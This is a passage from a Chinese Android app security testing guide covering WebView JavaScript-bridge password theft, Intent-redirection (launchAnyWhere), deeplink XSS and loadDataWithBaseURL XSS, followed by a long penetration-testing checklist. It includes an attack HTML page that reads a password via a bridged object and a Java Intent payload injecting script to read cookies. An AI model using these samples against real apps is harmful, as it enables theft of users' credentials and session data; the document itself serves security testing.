class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebView Atack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> password = test.<span class="title function_">getPassword</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;getdata&quot;</span>).<span class="property">innerHTML</span>= password;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;getdata&quot;</span>&gt;</span>攻击获得的数据将显示在此……<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>CIntent Attack!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>然后启动http_server</p><p><img src="2025-01-15-App安全分析指南/905443_25GBQWTFBW4APF8.png" alt="image-20220729172309137"></p><p>此时我们启动攻击样本，并点击按钮，就能加载我们的恶意html，进而获得敏感信息</p><h5 id="Intent重定向导致launchAnyWhere漏洞"><a href="#Intent重定向导致launchAnyWhere漏洞" class="headerlink" title="Intent重定向导致launchAnyWhere漏洞"></a><strong>Intent重定向导致launchAnyWhere漏洞</strong></h5><p><strong>漏洞原理</strong></p><p>导出组件往往存在一定的安全问题</p><p>导出组件一般有下面三种形式：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为<span class="keyword">true</span>;</span><br><span class="line"><span class="number">2.</span>如果组件没有显式设置android:exported为<span class="keyword">false</span>，但是其intent-<span class="keyword">filter</span>以及action存在，则也为导出组件</span><br><span class="line"><span class="number">3.</span>API <span class="keyword">Level</span>在<span class="number">17</span>以下的所有App的provider组件的android:exported属性默认值为<span class="keyword">true</span>，<span class="number">17</span>及以上默认值为<span class="keyword">false</span>。</span><br></pre></td></tr></table></figure><p>未导出组件</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">组件显式设置android:exported=<span class="string">&quot;false&quot;</span></span><br><span class="line">组件没有intent-<span class="built_in">filter</span>, 且没有显式设置android:exported的属性值，默认为非导出的;</span><br><span class="line">组件虽然配置了intent-<span class="built_in">filter</span>,，但是显式设置android:exported=<span class="string">&quot;false&quot;</span></span><br></pre></td></tr></table></figure><p>而通过一些方法可以访问未导出的组件，这种漏洞成为launchAnyWhere漏洞</p><p>Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起<code>launchAnyWhere</code>漏洞</p><p><strong>漏洞复现</strong></p><p>首先是不可导出组件PrivateActivity:</p><p><img src="2025-01-15-App安全分析指南/905443_DFCPGD63DGYF3HU.png" alt="image-20220730124850689"></p><p>然后可导出的组件：WebView2Activity</p><p>代码层的校验代码：</p><p>WebView2Activity</p><p><img src="2025-01-15-App安全分析指南/905443_UTXVH9Q5AYRTWVH-17277663837329.png" alt="image-20220730125041041"></p><p>PrivateActivity</p><p><img src="2025-01-15-App安全分析指南/905443_MMQXRU274JXCJRT-172776639201112.png" alt="image-20220730125108657"></p><p>攻击代码：</p><p><img src="2025-01-15-App安全分析指南/905443_W4Q2EBR4BJMXG2R-172776641592615.png" alt="image-20220730125254413"></p><p>可以看出我们通过WebView+Intent重定向就可以访问私有组件，从而实现launchAnyWhere漏洞</p><h4 id="Deeplink-WebView漏洞"><a href="#Deeplink-WebView漏洞" class="headerlink" title="Deeplink + WebView漏洞"></a>Deeplink + WebView漏洞</h4><h5 id="任意代码执行漏洞"><a href="#任意代码执行漏洞" class="headerlink" title="任意代码执行漏洞"></a><strong>任意代码执行漏洞</strong></h5><p><strong>漏洞原理</strong></p><p>样本代码层通过反射调用某个手机上已经安装的应用，然后调用这个应用的方法，我们可以构造相同的包名，然后将攻击样本安装到手机上去，使得应用触发任意代码执行漏洞</p><p>样本代码</p><p><img src="2025-01-15-App安全分析指南/905443_ZTVPKHEC4XQMYCD.png" alt="image-20220730125800892"></p><p>调用com.insecureshopapp.Maininterface下的getinstance方法</p><p>构造攻击样本</p><p><img src="2025-01-15-App安全分析指南/905443_J9EY8R3E44SH4U5.png" alt="image-20220730125820419"></p><p>注意这里我们要保证构造的攻击应用的包名和代码中校验的一致才能触发，然后我们启动，可以发现成功的触发了</p><h5 id="xss注入漏洞"><a href="#xss注入漏洞" class="headerlink" title="xss注入漏洞"></a><strong>xss注入漏洞</strong></h5><p><strong>漏洞原理</strong></p><p>结合Deeplink+WebView导致的一个漏洞问题，我们可以构造含深度调用链的js，然后通过加载去实现xss注入</p><p><strong>漏洞复现</strong></p><p>首先我们查看样本的DeepLinks</p><p><img src="2025-01-15-App安全分析指南/905443_NAWTWSGDKWK8C82.png" alt="image-20220730130234190"></p><p>然后我们可以发现样本的代码：</p><p><img src="2025-01-15-App安全分析指南/905443_8KJCX2AWWZRCTQQ.png" alt="image-20220730130256549"></p><p>我们构造攻击脚本：</p><p><img src="2025-01-15-App安全分析指南/905443_QA4SKBFC23HK4T8.png" alt="image-20220730130336427"></p><p>然后我们通过去访问该html:</p><p><img src="2025-01-15-App安全分析指南/905443_7XWKDCAB62358C7.png" alt="image-20220730130416578"></p><p>接着我们使用目标样本打开：</p><p><img src="2025-01-15-App安全分析指南/905443_WZVGRQ9J7AZPFDA.png" alt="image-20220730130442740"></p><p>即可以成功的进行XSS注入</p><p><img src="2025-01-15-App安全分析指南/905443_ARQAAUCNDV3N5BR.png" alt="image-20220730130506890"></p><h5 id="DeepLinks在WebView上的组合漏洞"><a href="#DeepLinks在WebView上的组合漏洞" class="headerlink" title="DeepLinks在WebView上的组合漏洞"></a>DeepLinks在WebView上的组合漏洞</h5><p>我们前面分析了很多DeepLinks在WebView上的漏洞，我们还可以将这些漏洞组合使用，我在测试一款银行的样本中发现组合漏洞：</p><p><img src="2025-01-15-App安全分析指南/905443_V55CMQ4ACJKK8WX.png" alt="image-20220730130714437"></p><p>参考文章：<a href="http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/">APP漏洞利用组合拳——应用克隆案例分析</a></p><h5 id="loadDataWithBaseURL漏洞"><a href="#loadDataWithBaseURL漏洞" class="headerlink" title="loadDataWithBaseURL漏洞"></a>loadDataWithBaseURL漏洞</h5><p><a href="https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?">Android中的特殊攻击面（二）——危险的deeplink</a></p><p>当<code>loadDataWithBaseURL</code>的域名和内容同时可控时，可以构造任意域下的XSS</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">void</span> loadDataWithBaseURL</span><br><span class="line">(<span class="built_in">String</span> baseUrl,</span><br><span class="line"><span class="built_in">String</span> <span class="built_in">data</span>,</span><br><span class="line"><span class="built_in">String</span> mimeType,</span><br><span class="line"><span class="built_in">String</span> encoding,</span><br><span class="line"><span class="built_in">String</span> historyUrl)</span><br></pre></td></tr></table></figure><p>除了明显的情况外，攻击者控制调用中的<code>baseUri</code>和参数<code>data</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webView.loadDataWithBaseURL<span class="punctuation">(</span><span class="string">&quot;https://google.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="string">&quot;&lt;script&gt;document.write(document.domain)&lt;/script&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="literal">null</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">,</span> <span class="literal">null</span><span class="punctuation">)</span><span class="punctuation">;</span></span><br></pre></td></tr></table></figure><p><strong>漏洞原理</strong></p><p>deeplink加载任意fragment，转化为WebView loadDataWithBaseURL漏洞</p><p><strong>漏洞复现</strong></p><p>实现步骤：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)victim-app://c/contact/<span class="number">2</span>?fragmen_class=<span class="variable">&lt;fragment&gt;</span>可启动任意<span class="keyword">fragment</span>，并可 通过Intent Extra传参</span><br><span class="line">(<span class="number">2</span>)寻找到⼀个带WebView的Fragment：GoogleMapWebViewFragment</span><br><span class="line">(<span class="number">3</span>)可污染<span class="built_in">load</span>DataWithBaseURL的前两个参数，构造victim.com域下的XSS</span><br><span class="line">webview.<span class="built_in">load</span>DataWithBaseURL(<span class="string">&quot;victim.com&quot;</span>,<span class="string">&quot;google-map.html&quot;</span>,    <span class="string">&quot;text/html&quot;</span>,    ...);</span><br></pre></td></tr></table></figure><p>攻击代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_VIEW);</span><br><span class="line">payload.setData(Uri.parse(<span class="string">&quot;victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment&quot;</span>));</span><br><span class="line"><span class="type">Bundle</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">extra.putString(<span class="string">&quot;map_url&quot;</span>, <span class="string">&quot;\&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&lt;script&gt;&quot;</span>);</span><br><span class="line">extra.putString(<span class="string">&quot;map_file_name&quot;</span>, <span class="string">&quot;google_map.html&quot;</span>);</span><br><span class="line">extra.putString(<span class="string">&quot;map_domain&quot;</span>, <span class="string">&quot;https://www.victim-app.com&quot;</span>);</span><br><span class="line">payload.putExtra(<span class="string">&quot;bundle&quot;</span>, extra);</span><br><span class="line">startActivity(payload);</span><br></pre></td></tr></table></figure><h1 id="安全分析工具安全"><a href="#安全分析工具安全" class="headerlink" title="安全分析工具安全"></a>安全分析工具安全</h1><h2 id="drozer"><a href="#drozer" class="headerlink" title="drozer"></a>drozer</h2><p>参考b站教程</p><h2 id="MobSF"><a href="#MobSF" class="headerlink" title="MobSF"></a>MobSF</h2><p>docker安装报错，参考<a href="https://kresna.dev/solving-podman-error-short-name-did-not-resolve-to-an-alias-and-no-unqualified-search-registries/">https://kresna.dev/solving-podman-error-short-name-did-not-resolve-to-an-alias-and-no-unqualified-search-registries/</a></p><p>github中下载项目，然后在相应文件夹下执行如下命令：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./setup.<span class="keyword">sh</span></span><br><span class="line">./<span class="keyword">run</span>.<span class="keyword">sh</span></span><br><span class="line">然后浏览器中 http:<span class="comment">//localhost:8000</span></span><br></pre></td></tr></table></figure><h1 id="APP渗透测试要点"><a href="#APP渗透测试要点" class="headerlink" title="APP渗透测试要点"></a>APP渗透测试要点</h1><p>测试点如下图<img src="2025-01-15-App安全分析指南/image-20241005195332293.png" alt="image-20241005195332293"></p><h2 id="客户端程序安全"><a href="#客户端程序安全" class="headerlink" title="客户端程序安全"></a>客户端程序安全</h2><h3 id="安装包签名"><a href="#安装包签名" class="headerlink" title="安装包签名"></a>安装包签名</h3><p>如下命令检查apk签名</p><p><strong>jarsigner.exe -verify APK 文件路径 -verbose -certs</strong>     如果CN=t001s则安全</p><p>只有在使用直接客户的证书签名时，才认为安全。Debug 证书、第三方（如</p><p>开发方）证书等等均认为风险。</p><p><strong>安全建议</strong></p><p>将安装包进行签名并检测安装包签名的异常</p><h3 id="反编译保护"><a href="#反编译保护" class="headerlink" title="反编译保护"></a>反编译保护</h3><p>​        测试客户端安装程序，判断是否能反编译为源代码，java 代码和 so 文件是否存在代码混淆等保护措施。未作保护的 java 代码，可以轻易分析其运行逻辑，并针对代码中的缺陷对客户端或服务器端进行攻击。成功的反编译将使得攻击者能够完整地分析 APP 的运行逻辑，尤其是相关业务接口协议、和通信加密的实现</p><p>如果apk有花指令，apktool会出现解包失败</p><h3 id="应用完整性校验"><a href="#应用完整性校验" class="headerlink" title="应用完整性校验"></a>应用完整性校验</h3><p>​        测试客户端程序是否对自身完整性进行校验。攻击者能够通过反编译的方法在客户端程序中植入自己的木马，客户端程序如果没有自校验机制的话，攻击者可能会通过篡改客户端程序窃取手机用户的隐私信息。</p><p><strong>如果没有进行校验</strong></p><p>对于修改后的apk进行重新打包签名安装，仍然会正常运行（需要注意的是，如果之前安装的 APK 和修改后的 APK 签名不同，就不能直接覆盖安装，一般来说，先卸载之前安装的 APP 即可）【注：APK 必须进行签名后，方可安装和运行。如果开启了“允许未知来源的应用”，那么 Debug 证书、自签名证书、过期证书的签名都是可以的，但是不可以不签名。】</p><p><strong>如果有进行校验</strong></p><p>安装的apk会无法正常运行</p><p><strong>威胁等级</strong></p><p>​        若应用完整性校验不使用 MANIFEST.MF 中的数据，且核心代码通过 JNI 技术写入.so库，同时于服务端进行相关校验，此时无风险。</p><p>​       若应用完整性于本地进行验证而不存在其他问题或使用 MANIFEST.MF 中的数据作为验证凭证（有新文件时提示应用完整性验证失败），此时低风险；</p><p>​       若在本地进行验证的基础上只通过 MANIFEST.MF 对客户端原有文件进行校验而忽略新增文件的检验，此时中风险；</p><p>​       若未进行应用完整性校验此时高风险</p><h3 id="组件安全"><a href="#组件安全" class="headerlink" title="组件安全"></a>组件安全</h3><p>查看是否是可导出的</p><h2 id="敏感信息安全"><a href="#敏感信息安全" class="headerlink" title="敏感信息安全"></a>敏感信息安全</h2><h3 id="数据文件"><a href="#数据文件" class="headerlink" title="数据文件"></a>数据文件</h3><p>检测客户端是否保存明文敏感信息，能否防止用户敏感信息的非授权访问。</p><p>文件敏感信息泄露以明文存储“记住密码”居多。一般来说，先将安卓设备中的文件复制到有鼠标的主机上，方便查看。</p><p><strong>测试步骤</strong></p><p>首先查看相关文件的权限配置。</p><p>正常的文件权限最后三位应为空（类似“rw-rw——”），即除应用自己以外任何人无法读写；目录则允许多一个执行位（类似“rwxrwx—x”）。</p><p>当客户端使用 MODE_WORLD_READABLE 或 MODE_WORLD_WRITEABLE 模式创建文件时，shared_prefs 目录下文件的权限也会多出一些，这不一定是安全问题</p><p>权限检测完整后，再检查客户端程序存储在手机中的 SharedPreferences 配置文件，通常是对本目录下的文件内容（一般是 xml）进行检查，看是否包含敏感信息。</p><p>最后在检测 SQLite 数据库文件，在私有目录及其子目录下查找以.db 结尾的数据库文件。对于使用了 webView 缓存的应用，会在 databases 子目录中保存 webview.db 和webviewCache.db，如图所示。其中有可能会记录 cookies 和提交表单等信息。</p><p>还有些时候，客户端程序 apk 包中也是是保存有敏感信息的，比如检查 apk 包中各类文件是否包含硬编码的的敏感信息等。</p><h3 id="Logcat日志"><a href="#Logcat日志" class="headerlink" title="Logcat日志"></a>Logcat日志</h3><p>本项主要是检查客户端程序存储在手机中的日志是否含有敏感信息。</p><p><strong>logcat -d</strong>    <strong>//一次性输出日志缓存，不会阻塞</strong> </p><p><strong>安全建议</strong></p><p>数据传输应做到加密处理，敏感信息不要输出在 logcat 日志中</p><h2 id="密码安全"><a href="#密码安全" class="headerlink" title="密码安全"></a><strong>密码安全</strong></h2><h3 id="键盘劫持"><a href="#键盘劫持" class="headerlink" title="键盘劫持"></a>键盘劫持</h3><p>测试客户端程序在密码等输入框是否使用自定义软键盘。安卓应用中的输入框默认使用系统软键盘，手机安装木马后，木马可以通过替换系统软键盘，记录手机键盘输过的密码</p><h3 id="随机布局软键盘"><a href="#随机布局软键盘" class="headerlink" title="随机布局软键盘"></a>随机布局软键盘</h3><p>测试客户端实现的软键盘，是否满足键位随机布放要求。</p><h3 id="屏幕录像"><a href="#屏幕录像" class="headerlink" title="屏幕录像"></a>屏幕录像</h3><p>客户端使用的随机布局软键盘是否会对用户点击产生视觉响应。当随机布局软键盘对用户点击产生视觉响应时，安卓木马可以通过连续截屏的方式，对用户击键进行记录，从而获得用户输入</p><p><strong>测试步骤</strong></p><p>adb shell /system/bin/screencap -p 输出 png 路径（安卓设备中）</p><p>在/mnt/sdcard/路径下，可以看到 1a.png：</p><p>还有一种验证方式是从代码方面进行验证：</p><p>首先检测需较高安全性的窗口（如密码输入框），看代码中在窗口加载时是否有类似下图的代码。按照 android SDK 的要求，开启 FLAG_SECURE 选项的窗口不能被截屏。<img src="2025-01-15-App安全分析指南/image-20241005211913001.png" alt="image-20241005211913001"></p><p>目前 FLAG_SECURE 测试结果：</p><p>N－PASS，可截图，</p><p>ZTE 880E, 可截图</p><p>ASUS TF300T，可阻止工具及 ddms 截图。</p><h3 id="手势密码"><a href="#手势密码" class="headerlink" title="手势密码"></a>手势密码</h3><p>主要从手势密码的复杂度、修改和取消、本地信息保存、锁定策略、抗攻击测试等方面进行测试。</p><p><strong>手势密码的复杂度：</strong></p><p>观察对应代码逻辑是否有相应的判断和限制条件。（一般设置手势密码若输入点数过少时会有相应的文字提示，通过此文字提示可以快速定位到代码位置）</p><p><strong>手势密码的修改和取消：</strong></p><p>反编译 APK 为 jar 包，通过 jd-gui 观察对应代码逻辑，寻找客户端对于手势密码的修改和删除是否存在相应的安全策略。</p><p><strong>手势密码的本地信息保存：</strong></p><p>首先通过正常的操作流程设置一个手势密码并完整一次完整的登陆过程，寻找/data/data 的私有目录下是否存在手势密码对应敏感文件，若进行了相关的信息保存，基本在此目录下。（关键词为 gesture，key 等）。观察存储方式是二进制形式还是明文形式，如果是二进制看看其对应位数判断进行的什么哈希散列。也可以通过这个数值定义代码位置进一步分析</p><p><strong>手势密码的抗攻击测试：</strong></p><ol><li><p>下载并安装 Xposed 框架及 SwipeBack 插件。</p></li><li><p>启动客户端并进入手势密码输入页。</p></li><li><p>启动 SwipeBack 插件，观察是否可以通过滑动关闭手势密码输入页的方式进入登陆后的页面</p></li></ol><h2 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h2><h3 id="密码复杂度检测"><a href="#密码复杂度检测" class="headerlink" title="密码复杂度检测"></a>密码复杂度检测</h3><p>测试客户端程序是否检查用户输入的密码强度，禁止用户设置弱口令</p><p>人工测试，尝试将密码修改为弱口令，如：123456，654321，121212，888888 等，查看客户端是否拒绝弱口令。也可以阅读逆向后的客户端 java 代码，寻找对用户输入口令的检查方法。</p><h3 id="账号登录限制"><a href="#账号登录限制" class="headerlink" title="账号登录限制"></a>账号登录限制</h3><p>测试一个帐号是否可以同时在多个设备上成功登录客户端，进行操作。</p><p>人工测试。</p><h3 id="账户锁定策略"><a href="#账户锁定策略" class="headerlink" title="账户锁定策略"></a><strong>账户锁定策略</strong></h3><p>测试客户端是否限制登录尝试次数。防止木马使用穷举法暴力破解用户密码</p><p>人工测试。</p><h3 id="问题验证"><a href="#问题验证" class="headerlink" title="问题验证"></a>问题验证</h3><p>测试对账号某些信息（如单次支付限额）的修改是否有私密问题验证。私密问题验证是否将问题和答案一一对应。私密问题是否足够私密</p><p>人工测试</p><h3 id="会话安全"><a href="#会话安全" class="headerlink" title="会话安全"></a>会话安全</h3><p>测试客户端在超过 20 分钟无操作后，是否会使会话超时并要求重新登录。超时时间设置是否合理。</p><p>人工测试</p><h3 id="界面切换保护"><a href="#界面切换保护" class="headerlink" title="界面切换保护"></a>界面切换保护</h3><p>检查客户端程序在切换到其他应用时，已经填写的账号密码等敏感信息是否会清空，防止用户敏感信息泄露。如果切换前处于已登录状态，切换后一定时间内是否会自动退出当前会话。</p><p><strong>测试步骤</strong></p><p>人工检测。在登录界面（或者转账界面等涉及密码的功能）填写登录名和密码，然后切出，再进入客户端，看输入的登录名和密码是否清除。登录后切出，5 分钟内自动退出为安全</p><h3 id="UI信息泄露"><a href="#UI信息泄露" class="headerlink" title="UI信息泄露"></a>UI信息泄露</h3><p>检查客户端的各种功能，看是否存在敏感信息泄露问题。</p><p>人工测试。使用错误的登录名或密码登录，看客户端提示是否不同。在显示卡号等敏感信息时是否进行部分遮挡。</p><h3 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h3><p>测试客户端在登录和交易时是否使用图形验证码。验证码是否符合如下要求：由数字和字母等字符混合组成；采取图片底纹干扰、颜色变换、设置非连续性及旋转图片字体、变异字体显示样式等有效方式，防范恶意代码自动识别图片上的信息；具有使用时间限制并仅能使用一次；验证码由服务器生成，客户端文件中不包含图形验证码文本内容。</p><h3 id="安全退出"><a href="#安全退出" class="headerlink" title="安全退出"></a>安全退出</h3><p>测试客户端退出时是否正常终止会话。</p><p>检查客户端在退出时，是否向服务端发送终止会话请求。客户端退出后，还能否使用退出前的会话 id 访问登录后才能访问的页面</p><h3 id="密码修改验证"><a href="#密码修改验证" class="headerlink" title="密码修改验证"></a>密码修改验证</h3><p>测试客户端在修改密码时是否验证旧密码正确性。</p><p>人工测试。</p><h3 id="Activity-界面劫持"><a href="#Activity-界面劫持" class="headerlink" title="Activity 界面劫持"></a><strong>Activity 界面劫持</strong></h3><p>检查是否存在 activity 劫持风险，确认客户端是否能够发现并提示用户存在劫持。</p><p>安装 HijackActivity.apk，使用 activity 界面劫持工具，在工具中指定要劫持的应用进程名称。如图所示，从列表中选择被测试的应用，点击 OK。打开应用，测试工具会尝试用自己的窗口覆盖被测的应用</p><h2 id="进程保护"><a href="#进程保护" class="headerlink" title="进程保护"></a>进程保护</h2><h3 id="内存访问和修改"><a href="#内存访问和修改" class="headerlink" title="内存访问和修改"></a><strong>内存访问和修改</strong></h3><p>通过对客户端内存的访问，木马将有可能会得到保存在内存中的敏感信息（如登录密码，帐号等）。测试客户端内存中是否存在的敏感信息（账号、明文密码等等）。</p><p>需要 root 权限，可以使用 MemSpector 查看、搜索和修改客户端内存数据，如图所示。用户名、密码等数据通常会在/dev/ashmem/dalvik-heap 内存段。（目前大多数工具都是通过 ptrace 接口修改客户端内存，可以使用 ptrace 机制本身防护。）</p><h3 id="动态注入"><a href="#动态注入" class="headerlink" title="动态注入"></a><strong>动态注入</strong></h3><p>通过注入动态链接库，hook 客户端某些关键函数，从而获取敏感信息或者改变程序执行。</p><h2 id="通信安全"><a href="#通信安全" class="headerlink" title="通信安全"></a>通信安全</h2><p>如果客户端与服务器之间的通信加密协议实现不当，攻击者将有机会对当前网络环境中其他合法用户的通信内容进行窃听甚至篡改。</p><h3 id="证书有效性"><a href="#证书有效性" class="headerlink" title="证书有效性"></a><strong>证书有效性</strong></h3><p>主要测试 SSL 协议安全性、SSL 证书验证等</p><p>首先测试客户端程序是否严格检查服务器端证书信息。通过修改 DNS，将客户端链接到的主页地址改为 <a href="https://mail.qq.com/，然后使用客户端访问服务端，查看客户端是否会提示连接错误。此项测试主要针对客户端是否对">https://mail.qq.com/，然后使用客户端访问服务端，查看客户端是否会提示连接错误。此项测试主要针对客户端是否对</a> SSL 证书中的域名进行确认。</p><p>也可以查阅代码中是否有 SSL 验证。下图是 Java 中进行服务端 SSL 证书验证的一种方式。关键函数为：java.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier()，通过此函数查找 HostnameVerifier 的 verify 函数。如 verify()函数总返回 true，则客户端对服务端 SSL 证书无验证。（可能还有其他 SSL 实现，需要验证）。</p><p><strong>安全建议</strong> </p><p>使用 Https 方式进行加密，且服务器通过白名单方式验证客户端证书。</p><h3 id="关键数据加密和校检"><a href="#关键数据加密和校检" class="headerlink" title="关键数据加密和校检"></a><strong>关键数据加密和校检</strong></h3><p>测试客户端程序提交数据给服务端时，密码、收款人信息等关键字段是否进行了加密，防止恶意用户嗅探到用户数据包中的密码等敏感信息。</p><p>在手机上配置好代理，观察客户端和服务端的交互数据。检查关键字端是否加密。如果客户端对根证书进行了严格检测，导致代理无法使用。则可以将代理的根证书安装到设备上，使根证书可信。或是替换客户端 apk 中的根证书文件。如果上述方法均失效，则反编译为 java 代码，将客户端逆向后，通过阅读 java 代码的方式寻找客户端程序向服务端提交数据的代码，检查是否存在加密的代码。</p><h3 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a><strong>访问控制</strong></h3><p>测试客户端访问的 URL 是否仅能由手机客户端访问。是否可以绕过登录限制直接访问登录后才能访问的页面，对需要二次验证的页面（如私密问题验证），能否绕过验证。</p><p>人工测试。在 PC 机的浏览器里输入 URL，尝试访问手机页面</p><h3 id="客户端更新安全性"><a href="#客户端更新安全性" class="headerlink" title="客户端更新安全性"></a><strong>客户端更新安全性</strong></h3><p>测试客户端自动更新机制是否安全。如果客户端更新没有使用官方应用商店的更新方式，就可能导致用户下载并安装恶意应用，从而引入安全风险。</p><p>使用代理抓取检测更新的数据包，尝试将服务器返回的更新 url 替换为恶意链接。看客户端是否会直接打开此链接并下载应用。在应用下载完毕后，测试能否替换下载的 apk 文件，测试客户端是否会安装替换后的应用。</p><h3 id="短信重放攻击"><a href="#短信重放攻击" class="headerlink" title="短信重放攻击"></a><strong>短信重放攻击</strong></h3><p>检测应用中是否存在数据包重放攻击的安全问题。是否会对客户端用户造成短信轰炸的困扰</p><p>尝试重放短信验证码数据包是否可以进行短信轰炸攻击</p><h2 id="业务安全"><a href="#业务安全" class="headerlink" title="业务安全"></a>业务安全</h2><h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致攻击账号拥有了其他账户的增删改查功能。</p><p>手工测试</p><h3 id="交易篡改"><a href="#交易篡改" class="headerlink" title="交易篡改"></a><strong>交易篡改</strong></h3><p>本项测试主要是修改金额信息（如：转帐金额为负值），订单信息（如：订单的数量）等</p><p>手工抓包测试。</p><p>服务端要做到严格的验证。（根据业务情形不同，安全建议也不相同，因此这里只能简单的一句话描述）</p><h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p>主要就是进行抓包重放（如：重放产品购买、订单创造等）测试。</p><p>人工测试</p><h3 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h3><p>尝试爆破枚举用户。</p><p>手工测试。</p><p>此类漏洞情境一般是：登录界面无验证码、有明显的返回信息（如：该账号不存在、密码错误等）</p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>主要是测试业务中查询、登录等功能，尝试使用暴力枚举的方式进行破解</p><p>手工测试</p><h3 id="注入-XSS-CSRF"><a href="#注入-XSS-CSRF" class="headerlink" title="注入/XSS/CSRF"></a><strong>注入/XSS/CSRF</strong></h3><p>和 WEB 测试类似，主要测试站点存在的常见的 web 漏洞</p><p>可手工测试也可以使用工具扫描、测试</p><h1 id="漏洞的一些分析-ByteCTF2021"><a href="#漏洞的一些分析-ByteCTF2021" class="headerlink" title="漏洞的一些分析 ByteCTF2021"></a>漏洞的一些分析 ByteCTF2021</h1><p><a href="https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg">https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg</a></p><p><a 